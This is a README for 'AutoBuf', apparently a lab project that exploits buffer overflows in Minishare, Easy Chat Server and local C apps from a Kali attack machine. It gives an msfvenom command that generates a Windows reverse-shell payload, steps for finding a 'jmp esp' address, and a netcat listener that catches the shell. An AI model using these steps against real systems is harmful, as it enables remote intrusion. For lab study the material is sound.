# AutoBuf
This project tests applications for buffer-overflow vulnerabilities. Tested with two local C apps, Minishare remote application, Easy share application.

INSTALLATIONS AND TOOLS
1. Windows 10/11(Victim Machine)
2. Kali Linux over VirtualBox(Attack Machine)
3. Immunity Debugger(On Victim Machine)
4. Python 3.8
5. Pwntools
6. Gnu Debugger
7. Minishare 3.4
8. Easy Chat Server 1.4.1

CONFIGURATION AND SETTING UP(IMMUNITY DEBUGGER)
1. Open Immunity Debugger as administrator on windows
2. Open Minishare 1.4.1 as admin on windows
3. Attach Minishare to Immunity Debugger
4. View Executable Modules, find SHELL32.dll and double click
5. Find ‘jmp esp’ command address and take note of it
6. Open Kali linux
7. Find your kali ip address
8. Run(msfvenom -p windows/shell_reverse_tcp LHOST=#ipaddress LPORT=4444 x86/shikata_ga_nai -b “\x00\x0a\x0d” -f py) in your kali machine to generate reverse shell for your ip and port
9. Open BufAutoDetext, 
* Input the result of the above command as the new value for the ‘buf’ variable.
* Input  the address gotten from ‘jmp esp’ in reverse into the shellcode
10. Run BufAutoDetect.py and open a new terminal to listen on port 4444

RUNNING AND TESTING LOCAL APPS
1. Start and load up kali linux in the Virtual Box.
2. Open the new Kali Linux terminal and navigate to the base folder for AutoBuf.
3. Compile C apps with... gcc app.c/app1.c -o app/app1 -fno-stack-protector -no-pie
4. Run the command...python3 BufAutoDetect.py local -p n, then add directory to C apps
5. Payloads include n,an,l

RUNNING AND TESTING MINISHARE REMOTE APPS
1. Start Kali Linux on the attack machine and minishare on the victim machine.
2.  Open the new Kali Linux terminal and navigate to the base folder for AutoBuf.
3. Run the command...python3 BufAutoDetect.py remote1 -ip #ipaddressofwindows -s #portofMinishare
4. Then open a new terminal and listen to the output of the script using ...nc -l -p 4444

RUNNING AND TESTING EASYCHAT SERVER REMOTE APPS
1. Start Kali Linux on the attack machine and easy chatserver on the victim machine.
2.  Open the new Kali Linux terminal and navigate to the base folder for AutoBuf.
3. Run the command...python3 BufAutoDetect.py remote2 -ip #ipaddressofwindows -s #portofEasychatserver
4. Calc.exe runs as easychat is overflowed





Video demonstration and Pictures coming soon









